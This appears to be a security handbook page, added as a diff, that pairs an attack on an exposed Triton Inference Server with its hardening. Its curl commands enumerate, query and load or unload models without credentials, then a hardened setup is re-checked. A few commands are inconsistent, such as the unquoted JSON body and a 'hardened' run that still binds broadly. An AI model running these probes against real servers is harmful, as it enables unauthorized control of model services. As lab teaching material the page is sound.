@@ -1,0 +1,219 @@
+---
+title: "Recipe: pwn an exposed Triton inference server, then close it"
+toc-title: Recipe
+---
+
+| Field | Value |
+|---|---|
+| Tools | `triton-pwn` (A-7, exp) ↔ `triton-inference-server` (O-2 lab target) + observability rows |
+| Section | Attack–defence pairs |
+| Level | medium |
+| Time | ~40 min (boot + probe sweep + posture flip) |
+| Layer/Category | ATTACK / A-7 + OPS / O-2 ↔ DEFENCE / d-02 (pending rows) |
+| Tags | `pair`, `platform`, `triton`, `exp`, `owasp-llm02`, `owasp-llm10` |
+
+## Problem
+
+A Triton Inference Server speaks the KServe v2 protocol on three
+default ports — HTTP 8000, gRPC 8001, metrics 8002 — and the control
+surface rides the SAME HTTP port as inference: with the right shaped
+POST, an unauthenticated client can ask the server to load or unload
+models from a declared model-repository path at
+`POST /v2/repository/models/<model>/load|unload` alongside
+`POST /v2/repository/index`. Anyone who can reach the port can
+inspect what is served (health + model index), drive inference, and —
+the LLM10 half — change what is served. The quickstart posture makes
+it worse for lab realism: upstream's own quickstart binds
+`0.0.0.0:8000`. The manifest maps the surface to OWASP LLM02 + LLM10
+and the `triton-pwn` row to ATLAS AML.T0049 + T0050. You want to
+demonstrate the exposure against the lab-booted server (the Shape-3
+container posture: `triton-inference-server` ships as a
+docker-wrapper row, podman, `autoStart=false`; A-7 never rides this
+shape — the attack side drives the shapes from the base system at a
+booted target), then flip the posture closed and see the probe
+results invert.
+
+## Solution
+
+Two legs, one sweep, shape-for-shape:
+
+```bash
+# 1. BOOT THE LAB TARGET — triton is a docker-wrapper row (Shape 3):
+#      kailash info triton-inference-server
+#    -> packaging docker-wrapper (podman), autoStart=false, pin
+#       semitechnologies/weaviate:1.39.2-style Shape-3 row (image
+#       per upstream's quickstart container). Lab boot = turning the
+#       backend on; the A-7 attack tooling NEVER rides inside that
+#       container — probes run from the base system at the port.
+#    Minimal lab posture for the exposed leg (isolated lab segment:
+#      docker run --rm --gpus all --shm-size=256m -p 8000:8000 \
+#        -v /models:/models tritonserver --model-repository=/models
+#    (upstream's quickstart banner reads: Started HTTPService at
+#     0.0.0.0:8000  — the broad bind is the thing being tested)
+
+# 2. HEALTH + ENUMERATION (HTTP 8000, no credentials):
+curl -fsS http://<target>:8000/v2/health/live
+curl -fsS http://<target>:8000/v2/health/ready
+curl -fsS http://<target>:8000/v2/models/<model>/versions/<v>/ready
+#    -> 200s; the KServe v2 readiness shapes
+
+# 3. INFERENCE (the LLM02 half — protocol shape, no key checked):
+curl -fsS http://<target>:8000/v2/models/<model>/infer \
+     -H 'Content-Type: application/json' \
+     -d {"inputs":[...],"outputs":[...]}
+#    -> inference result per the model's declared I/O shape
+
+# 4. MODEL-REPOSITORY CONTROL (the LLM10 half — the control surface):
+curl -fsS http://<target>:8000/v2/repository/index \
+     -H 'Content-Type: application/json' -d '{}'
+#    -> [{"name":"<model>","version":"<v>","state":"READY"}, ...]
+curl -fsS -X POST http://<target>:8000/v2/repository/models/<model>/load \
+     -H 'Content-Type: application/json' -d '{"parameters":{}}'
+#    -> the server loads the model from the declared repo path
+curl -fsS -X POST http://<target>:8000/v2/repository/models/<model>/unload \
+     -H 'Content-Type: application/json' -d '{}'
+#    -> the server unloads it — inference now FAILS via #3; you just
+#       toggled what the server serves, unauthenticated
+
+# 5. METRICS (port 8002 — separate port, same reachability logic):
+curl -fsS http://<target>:8002/metrics
+#    -> Prometheus exposition (inference counts, latencies, cache)
+```
+
+Then the verification leg — flip the posture, re-run the same sweep:
+
+```bash
+# 6. THE FLIP (three controls, one deliberate posture):
+#      a. bind: the server MUST NOT answer 0.0.0.0 in production —
+#         the quickstart banner is a lab convenience, not a bind
+#         recommendation; keep the container loopback-reachable only
+#         (publish -p 127.0.0.1:8000:8000, or put the container on an
+#          isolated lab segment), and
+#      b. metrics off at the server flag:
+docker run --rm --gpus all --shm-size=256m -p 8000:8000 \
+  -v /models:/models tritonserver --model-repository=/models \
+     --allow-metrics=false
+#      (the /metrics endpoint on 8002 is then absent — the exposition
+#       stops being a segment-readable telemetry feed)
+#      c. restricted-API gate (BETA surface): upstream exposes a
+#         restriction mechanism that requires a key on the sensitive
+#         APIs —
+#         --http-restricted-api=<apis>:<restricted-key>=<restricted-value>
+#         e.g. --http-restricted-api=repository-control:<key>=<val>
+#         (BETA: a lab-grade gate, not a hardened perimeter)
+nixos-rebuild test 2>/dev/null || docker stop <container>
+#    (flip = stop the broad-bind container; re-boot with the posture
+#     above, or the loopback-publish variant)
+
+# 7. SAME sweep, same box:
+curl -s -o /dev/null -w '%{http_code}\n' http://<target>:8000/v2/health/live
+#    -> FAIL (refused) from the segment — loopback-publish closed the
+#       whole port to the segment. /metrics absent (--allow-metrics
+#       false); load/unload demand the restricted key. Diff = evidence.
+```
+
+Expected output shape (abridged, shapes not transcripts):
+
+```
+sweep @ http://<target>:8000  posture: quickstart bind (0.0.0.0), no gate
+  /v2/health/live      -> ok 200
+  /v2/health/ready     -> ok 200
+  /v2/models/<m>/infer -> ok (shape per model I/O)
+  /v2/repository/index -> ok [{"name":"<m>","state":"READY"}]
+  /v2/repository/models/<m>/load|unload -> ok (state toggled)
+  :8002/metrics        -> ok exposition
+sweep again, hardened posture (loopback-publish + flags)
+  health/infer/index/load/unload -> FAIL (refused from segment)
+  :8002/metrics        -> absent (flag off)
+  repository control   -> key demanded where the restricted-API gate
+                          covers it (BETA surface)
+```
+
+## Discussion
+
+- **Why plain curl and not a bespoke exploit script:** `triton-pwn` is
+  an A-7 row, `safety.level: exp`, licence `LicenseRef-Unknown`, with
+  the upstream repository missing at the pin
+  ([kailash-os#23](https://github.com/kailash-os/kailash-os/issues/23)).
+  The probe leg runs the verified KServe v2 shapes against the booted
+  target; the real tool takes over when its derivation lands via the
+  double-key lab gate (walk:
+  [Gate lab-mode and exp-classified
+  tools](../admin/lab-mode-gating.html)).
+- **Shape 3 is why the lab leg looks the way it does:** the
+  triton-inference-server row is a docker-wrapper row — podman,
+  `autoStart=false`, a pinned upstream container. In this book's
+  packaging grammar, that is the Shape-3 posture (the packaging shape
+  documented in docs/guide/o-03-docker-wrapper-stores.md), and the
+  A-7 attack tooling NEVER rides inside that shape ("A-7 never in
+  this shape" is the packaging note's line verbatim) — the A-7 attack
+  rides a lab-booted container target while native attack tooling
+  stays out of the container. The boot IS the lab posture: turning
+  the backend on is what makes the target answer.
+- **The load/unload verbs are the pair's teeth:** enumeration shows
+  what is served; inference shows what it returns; the repository
+  control pair changes what is served — unload the model and the
+  same inference shape fails, load it back and it answers again.
+  That toggle is the LLM10 evidence: control surface on the same
+  unauthenticated port as the data surface.
+- **The BETA gate is honest about being BETA:** `--http-restricted-api`
+  (with its restricted key/value) is upstream's Beta restricted-API
+  mechanism — better than nothing, worth using, but a Beta surface is
+  not a hardened perimeter; the bind + firewall remain the
+  load-bearing controls, and vLLM's identical story (key never covered
+  everything) is a different server with the same moral: perimeter
+  beats flag.
+- **The observability defence leg is a pending row, stated honestly:**
+  Phoenix (Arize) is the trace destination: OTLP/HTTP exporter to
+  `:6006/v1/traces` (gRPC :4317), server via `phoenix serve`; and
+  Evidently is the report layer — `Report`/`DataDefinition` +
+  column descriptors over captured request logs, producing the drift/
+  data-quality view that makes an unexplained inference spike visible.
+  Both are d-02 rows with upstream config flows that exist; their
+  kailash module wiring is PENDING at the pin — quoted as the design,
+  not as a landed surface. The traces/reports become the standing
+  anomaly view that the probes hand-verified during the pair.
+- **This is the transferable pattern:** lab target up → probe sweep
+  → posture flip → same sweep → diff. Origin walk with the verdict
+  instrument: [Attack the platform, then
+  verify](attack-then-verify.html).
+
+## See also
+
+- [Attack the platform, then verify](attack-then-verify.html) — the
+  mlflow pair; the verdict + record discipline this recipe follows
+- [Serve a local model for scanning](../ops/serve-a-model.html) —
+  the model-surface analog; the O-2/O-4 serving lane
+- [Gate lab-mode and exp-classified
+  tools](../admin/lab-mode-gating.html) — the exp gate the real tool
+  rides when its derivation lands
+- Upstream quickstart + HTTP/REST protocol docs:
+  <https://github.com/triton-inference-server/server/blob/main/docs/getting_started/quickstart.md>
+- Upstream restricted-API (BETA) surface:
+  <https://github.com/triton-inference-server/server/blob/main/docs/protocol/extension_classification.md>
+- Upstream missing-repository note:
+  [kailash-os#23](https://github.com/kailash-os/kailash-os/issues/23)
+- [Recipe directory](../directory.html)
+
+---
+
+**Recipe provenance.** Manifest facts (A-7 `triton-pwn` row exp +
+`LicenseRef-Unknown`, ATLAS AML.T0049 + T0050, OWASP LLM02 + LLM10
+both epochs; triton-inference-server O-2 row — docker-wrapper
+backend, podman, autoStart=false, Shape 3) are from the packages
+manifest rows + lane comments, verified 2026-10-14. Upstream surface
+checked at the server docs at the pin: KServe v2 shapes (`GET
+v2/health/live|ready`, `GET
+v2/models/${MODEL}/versions/.../ready`, `POST
+v2/models/${MODEL}/infer`, `POST v2/repository/index`,
+`POST models/${MODEL}/load|unload`), ports 8000/8001/8002, the
+quickstart `Started HTTPService at 0.0.0.0:8000` banner,
+`--allow-metrics=false` and the BETA
+`--http-restricted-api=<apis>:<restricted-key>=<restricted-value>`
+mechanism, the docker-wrapper Shape-3 note ('A-7 never in this
+shape') — verified 2026-10-14. Phoenix/Evidently kailash module
+wiring PENDING at the pin: quoted above as design, not as a landed
+surface.
+
+
+ref: [Triton quickstart/protocol docs + packages manifest rows](https://github.com/triton-inference-server/server) - verified 2026-10-14. Missing A-7 repo: [kailash-os#23](https://github.com/kailash-os/kailash-os/issues/23).
